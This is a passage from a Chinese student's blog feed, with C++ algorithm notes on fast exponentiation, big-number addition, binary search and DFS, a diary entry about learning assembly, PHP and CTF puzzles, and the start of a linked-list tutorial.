class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">quick</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x,<span class="keyword">long</span> <span class="keyword">long</span> y)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">1</span>,base = x;</span><br><span class="line"><span class="keyword">while</span>( y &gt; <span class="number">0</span> )</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>( y % <span class="number">2</span> )</span><br><span class="line">{</span><br><span class="line">ans *= base;</span><br><span class="line">}</span><br><span class="line">base *= base;</span><br><span class="line">y /= <span class="number">2</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> m,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; quick(m,n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个可以计算到2的62次方左右，因为long long的范围有限；</p><h3 id="大数相加（模拟）"><a href="#大数相加（模拟）" class="headerlink" title="大数相加（模拟）"></a>大数相加（模拟）</h3><p>这个挺有意思的题目，上大学之前刷题的时候就有人说，初学者做不出来“A+B”，当时我还笑了，“A+B”有什么难</p><p>的，一个输入一个输出不就完事，后来有人说，那你计算111….(100个1) + 222….(100个2)的值，我一想，不行</p><p>啊，int不够，long long不够，int64页不够，我就放弃了；再后来….咳，请看代码：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//大数相加</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> m=<span class="number">1</span>,n=<span class="number">1</span>,i,j,L1,L2,k;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">1002</span>],b[<span class="number">1002</span>];</span><br><span class="line"><span class="keyword">int</span> num1[<span class="number">1002</span>],num2[<span class="number">1002</span>];</span><br><span class="line"><span class="built_in">memset</span>(num1,<span class="number">0</span>,<span class="keyword">sizeof</span>(num1));    <span class="comment">//数组清零 </span></span><br><span class="line"><span class="built_in">memset</span>(num2,<span class="number">0</span>,<span class="keyword">sizeof</span>(num2));    <span class="comment">//数组清零</span></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b;                  <span class="comment">//输入数组 </span></span><br><span class="line">L1 = <span class="built_in">strlen</span>(a);  <span class="comment">//计算数组a的长度 </span></span><br><span class="line">L2 = <span class="built_in">strlen</span>(b); <span class="comment">//计算数组b的长度 </span></span><br><span class="line"><span class="keyword">for</span>(i=L1<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">{</span><br><span class="line">num1[m] = a[i] - <span class="string">'0'</span>;   </span><br><span class="line">m++;   <span class="comment">//字符--&gt;数字 </span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(i=L2<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">{</span><br><span class="line">num2[n] = b[i] - <span class="string">'0'</span>;    </span><br><span class="line">n++;  <span class="comment">//字符--&gt;数字 </span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">1002</span>;i++)</span><br><span class="line">{</span><br><span class="line">k = i;</span><br><span class="line">num1[i] += num2[i];<span class="comment">// num1数组当成一个新的数组，重新赋值 </span></span><br><span class="line"><span class="keyword">if</span>(num1[i]&gt;<span class="number">9</span>)</span><br><span class="line">{</span><br><span class="line">num1[i] = num1[i]%<span class="number">10</span>;<span class="comment">//判断是否超过10 超过进位 </span></span><br><span class="line">num1[++k] ++;<span class="comment">//下一位进 1 </span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1001</span>;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(num1[i]!=<span class="number">0</span>) <span class="comment">//判断什么时候不为 0 </span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span>(j=i;j&gt;<span class="number">0</span>;j--)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; num1[j];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>原来啊，把数字转换成字符串的形式，这样的话，就很容易了；</p><p>学会了吗，去练习一下吧：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1002" target="_blank" rel="noopener">杭电1002</a></p><h3 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h3><p>这个算法是过双创中心面试之后第一个讲解的算法，其实现在还是懵懵的；</p><p>二分查找法，其实是一种有序的查找方法，也称折半查找，如果是无序的则要先进行排序操作；</p><p>基本思想是：目标值通过与中间元素比较，可分为三种情况：</p><p>1、目标值与中间元素相等，查找结束；</p><p>2、目标值比中间元素大，则把后半部分的中间元素与目标值比较；</p><p>3、目标值比中间元素小，则把前半部分的中间元素与目标值比较；</p><p>这三步一直循环，直到找到答案为止；</p><p>适用情况：求最大值中的最小值、求最小值中的最大值；（听着很别扭，其实就是这样）</p><p>类似于数学里面的二分，思想差不多；</p><p>以一道题来举例：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=4004" target="_blank" rel="noopener">杭电4004</a></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">500200</span>];</span><br><span class="line"><span class="keyword">int</span> L,n,m;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> x)</span> <span class="comment">//二分函数</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i,cnt=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(a[i]-a[i<span class="number">-1</span>]&gt;x)</span><br><span class="line">        {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">        <span class="keyword">if</span>(a[i]-t&gt;x)</span><br><span class="line">        {</span><br><span class="line">            cnt++;</span><br><span class="line">            t=a[i<span class="number">-1</span>];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(cnt+<span class="number">1</span>&lt;=m)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> mid,i;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;L&gt;&gt;n&gt;&gt;m)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        {</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">}</span><br><span class="line">        a[<span class="number">0</span>]=<span class="number">0</span>,a[++n]=L;</span><br><span class="line">        sort(a,a+n+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>,r=L,res;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r) <span class="comment">//这里的小于等于千万不能忘记等于</span></span><br><span class="line">        {</span><br><span class="line">            mid=(l+r)/<span class="number">2</span>; <span class="comment">//分半</span></span><br><span class="line">            <span class="keyword">if</span>(check(mid)) <span class="comment">//取左</span></span><br><span class="line">            {</span><br><span class="line">                res=mid;</span><br><span class="line">                r=mid<span class="number">-1</span>;</span><br><span class="line">            }</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//取右</span></span><br><span class="line">            {</span><br><span class="line">            l=mid+<span class="number">1</span>; </span><br><span class="line">}</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; res &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这题是不是太难了呀，不要紧，在给你一道简单的：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=2199" target="_blank" rel="noopener">杭电2199</a></p><p>这题算是很简单的二分了，要是不会的话，回来看代码：</p><p>注意啊，这段代码里面的cin和cout要改成C语言的scanf和printf，不知为什么cin和cout过不去，可能因为保留的</p><p>小数位数吧，就很离谱；</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">(<span class="keyword">double</span> x)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> (<span class="number">8</span>*x*x*x*x+<span class="number">7</span>*x*x*x+<span class="number">2</span>*x*x+<span class="number">3</span>*x+<span class="number">6</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"><span class="keyword">double</span> l,r,m,n,mid;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line"><span class="keyword">while</span>(t--)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m;</span><br><span class="line">l=<span class="number">0</span>,r=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">if</span>(f(<span class="number">0</span>)&gt;m||f(<span class="number">100</span>)&lt;m)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"No solution!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">while</span>(r-l &gt; <span class="number">0.000001</span>)</span><br><span class="line">{</span><br><span class="line">   mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">   <span class="keyword">if</span>((f(mid)-m) &gt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">   r = mid;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">{</span><br><span class="line">l = mid;</span><br><span class="line">} </span><br><span class="line">}</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; setprecision(<span class="number">5</span>) &lt;&lt; r &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Dfs-amp-Bfs"><a href="#Dfs-amp-Bfs" class="headerlink" title="Dfs &amp; Bfs"></a>Dfs &amp; Bfs</h3><p>相信打过acm比赛的人都知道这两种算法，一种叫做dfs（深度优先搜索），一种叫做bfs（广度优先搜索）；</p><p>怎么说呢，折两种算法早就想学了，就是没找到机会，现在正好学习算法，就简单学学吧；</p><h4 id="Dfs"><a href="#Dfs" class="headerlink" title="Dfs"></a>Dfs</h4><p>深度优先搜索算法（Depth First Search，简称DFS）：一种用于遍历或搜索树或图的算法。 沿着树的深度遍历树</p><p>的节点，尽可能深的搜索树的分支，当节点v的所在边都己被探寻过或者在搜寻时结点不满足条件，搜索将回溯到</p><p>发现节点v的那条边的起始节点，整个进程反复进行直到所有节点都被访问为止；</p><h5 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(参数)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(满足条件)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> <span class="built_in">step</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">        判断边界</span><br><span class="line">        {</span><br><span class="line">            ...操作</span><br><span class="line">        }</span><br><span class="line">        尝试每一种可能</span><br><span class="line">        {</span><br><span class="line">               满足check条件</span><br><span class="line">               标记</span><br><span class="line">               继续下一步dfs(<span class="built_in">step</span>+<span class="number">1</span>)</span><br><span class="line">               恢复初始状态（回溯的时候要用到）</span><br><span class="line">        }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>模板也是根据实际情况来改，下面通过一个实例来了解一下：</p><h5 id="全排列问题"><a href="#全排列问题" class="headerlink" title="全排列问题"></a>全排列问题</h5><p>问题描述：1~n , n个数字，能组成多少个不同的数字？</p><p>例如：n=3，则能组成的数字有：123 , 132 , 213 , 231 , 312 , 321</p><h5 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>], book[<span class="number">10</span>], n,num=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> step)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span> (step == n + <span class="number">1</span>) <span class="comment">//判断边界</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a[i];num++;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) <span class="comment">//遍历</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (book[i] == <span class="number">0</span>) <span class="comment">//满足check</span></span><br><span class="line">{</span><br><span class="line">a[step] = i;</span><br><span class="line">book[i] = <span class="number">1</span>;  <span class="comment">//标记</span></span><br><span class="line">dfs(step + <span class="number">1</span>); <span class="comment">//继续搜索</span></span><br><span class="line">book[i] = <span class="number">0</span>; <span class="comment">//恢复初始状态</span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> num;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">dfs(<span class="number">1</span>); <span class="comment">//从第一个开始</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"共有"</span> &lt;&lt; num/n &lt;&lt; <span class="string">"个"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="Bfs"><a href="#Bfs" class="headerlink" title="Bfs"></a>Bfs</h4><p>广度优先算法（Breadth-First-Search，简称BFS），是一种图形搜索演算法。简单的说，BFS是从根节点开始，沿</p><p>着树的宽度遍历树的节点，如果发现目标，则演算终止；</p><p>.</p><p>.</p><p>这个算法到现在没学会，就算了吧，有时间系统学习一下再整理；23333</p><p>.</p><p>.</p><p>.</p><p>未完待续😀</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/algorithm/#disqus_thread</comments>
    </item>
    
    <item>
      <title>2月29日的深更半夜</title>
      <link>https://www.los-kos.cn/posts/2-29-diary/</link>
      <guid>https://www.los-kos.cn/posts/2-29-diary/</guid>
      <pubDate>Sat, 29 Feb 2020 14:00:00 GMT</pubDate>
      <description>
      
        一篇小总结，嘻嘻嘻
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>这篇博客呢就闲聊一点吧，反正今天也是一个特殊的日子；</p><a id="more"></a><p>​        寒假到今天为止50天了，因为疫情原因，大把好时光就这么浪费了，真是难过又觉得可惜，先自我作个总结吧：</p><p>​        从寒假第一天开始，玩了一个多星期的王者荣耀（自己很不务正业），想着自己还有任务，赶紧学习，还来得及其实，但是吧，我这人，虽说自觉性很高，但是吧，想耐住性子学习还真不容易；</p><p>​        况且，我们任务学习汇编和PHP。这种底层语言真的是很无聊，学着就想吐；刚开始接触PHP的时候感觉很好玩，但是学了一段时间，发现，它的语法还有格式对我这种强迫症来讲，算了算了吧，实在是驾驭不了；</p><p>​        我就重点学习汇编，汇编说实话，更麻烦，枯燥无味，很繁琐，可能受C，C++的影响，底层语言真的是无话可说，顿时感觉高级语言好玩；</p><p>​        讲真的，想过放弃，但是某一天，堆堆给了我XCTF的链接，我一进去，哇塞，好酷的页面，瞬间又有了学习的动力，我就注册账号，发现题目不是想象的那样，太难了；但是没关系，谁能一开始就觉得简单呢，我就边玩边学，耐得住性子，坐在写字桌前面看书看视频，开头难但是还得学好。。。</p><p>​        第一次做出来一道CTF的题目的时候，我那心情，别提有多高兴，题目考验的不仅仅是思维能力，还有计算能力，使用工具的能力，印象最深的是一道P二维码的题目，为了做它，新学了一点PS基础，P了一个晚上还没出来，心态没了；</p><p>​        再后来，老师收集学习进度说还得整blog（一提到blog我就来气），看着教程做都做不出来，多亏了柠檬大佬，才有了今天在这里写似日记非日记的东西（嘻嘻嘻）；</p><p>​        最近，又得学习Python，还得装虚拟机，虚拟机更是麻烦，所有的错误情况我都遇见了估计，没有比我还倒霉的啦，现在还没装，没心情了，想着尽快把Python基础学完才行，才能进行下一个学习计划；</p><p>、</p><p>、</p><p>、</p><p>长路漫漫，为了拿offer，为了将来，加油干<del>~</del></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/2-29-diary/#disqus_thread</comments>
    </item>
    
    <item>
      <title>链表—Link List</title>
      <link>https://www.los-kos.cn/posts/ad6fb827/</link>
      <guid>https://www.los-kos.cn/posts/ad6fb827/</guid>
      <pubDate>Tue, 18 Feb 2020 04:23:34 GMT</pubDate>
      <description>
      
        为数据结构做铺垫，探索链表的奥秘哦
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>链表是C语言中非常难理解的一个知识点，可以说是比指针还难学的东西。在学习数据结构的时候常常会用到，所</p><p>以想来想去有必要整理一波；</p><a id="more"></a><p>链表种类很多种，有单向链表，双向链表，空头链表，非空头链表，循环链表，非循环链表；</p><p>这里我只学了单向空头和单向非空头链表，先整理这两种，以后学完再添加；</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>链表实际上是线性表的链式存储结构，与数组不同的是，它是用一组任意的存储单元来存储线性表中的数据，存储</p><p>单元不一定是连续的；</p><p>且链表的长度不是固定的，链表数据的这一特点使其可以非常的方便地实现节点的插入和删除操作；</p><p>链表的每个元素称为一个节点，每个节点都可以存储在内存中的不同的位置，为了表示每个元素与后继元素的逻辑</p><p>关系，以便构成“一个节点链着一个节点”的链式存储结构；</p><p>除了存储元素本身的信息外，还要存储其直接后继信息，因此，每个节点都包含两个部分，第一部分称为链表的数</p><p>据区域，用于存储元素本身的数据信息，第二部分是一个结构体指针，称为链表的指针域，用于存储其直接后继的</p><p>节点信息；</p><p>next的值实际上就是下一个节点的地址，当前节点为末节点时，next的值设为空指针；</p><h4 id="优点（相对于数组）"><a href="#优点（相对于数组）" class="headerlink" title="优点（相对于数组）"></a>优点（相对于数组）</h4><p>对线性表进行删除，添加等操作时候，不需要移动大量数据，操作简便，而数组需要动用大量数据，十分困难；同</p><p>时链表属于动态分配内存，数据量可以改变，而数组长度必须提前定义好，属于静态分配内存；链表省空间，数组</p><p>容易越界，长度过长又会造成系统资源浪费；</p><p>总的来说，链表优点非常多；</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>单向链表只能顺序访问，不能随机访问，这种储存结构最大缺点就是容易断链；一旦某个节点指针域数据丢失，将</p><p>无法找到下一个节点，也就是说，该节点的后面的数据全部丢失；</p><h3 id="无空头链表"><a href="#无空头链表" class="headerlink" title="无空头链表"></a>无空头链表</h3><h4 id="头文件-函数声明-结构体-全局变量"><a href="#头文件-函数声明-结构体-全局变量" class="headerlink" title="头文件+函数声明+结构体+全局变量"></a>头文件+函数声明+结构体+全局变量</h4><p>头文件stdlib.h，调用malloc（）函数和free（）函数；</p><p>函数比较多，先声明一下，便于阅读；</p><p>结构体先设一个成员，根据自己情况来设；</p><p>设全局变量的话，写各个操作函数的时候就省了一个形参；</p><h5 id="头文件（根据使用的语言自行修改）"><a href="#头文件（根据使用的语言自行修改）" class="headerlink" title="头文件（根据使用的语言自行修改）"></a>头文件（根据使用的语言自行修改）</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h5 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 